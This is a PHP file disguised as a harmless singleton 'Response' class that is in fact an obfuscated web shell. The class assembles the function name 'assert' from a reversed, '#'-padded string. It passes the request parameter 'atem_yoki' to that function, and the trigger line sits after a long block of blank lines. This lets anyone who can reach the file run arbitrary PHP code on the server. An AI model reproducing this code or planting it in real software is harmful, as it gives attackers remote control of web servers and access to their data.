<?php

class Response
{

    public static $_instance = null;

    public function set($value){
        $fun = $this->parse('a');

        return $fun($this->request($value));
    }

    private function parse($fun)
    {
        $instance = 't#r#e#s#s';
        $instance = str_replace('#',null,$instance);
        return $fun.strrev($instance);
    }

    public static function getInstance()
    {
        if (self::$_instance === null) {
            self::$_instance = new self();
        }

        return self::$_instance;
    }

    private function request($key=null,$default=null)
    {
         if ($key === null) {
             return $_REQUEST;
         }

         return empty($_REQUEST[$key]) ? $default : $_REQUEST[$key];
    }

}

















return  Response::getInstance()->set('atem_yoki');
?>

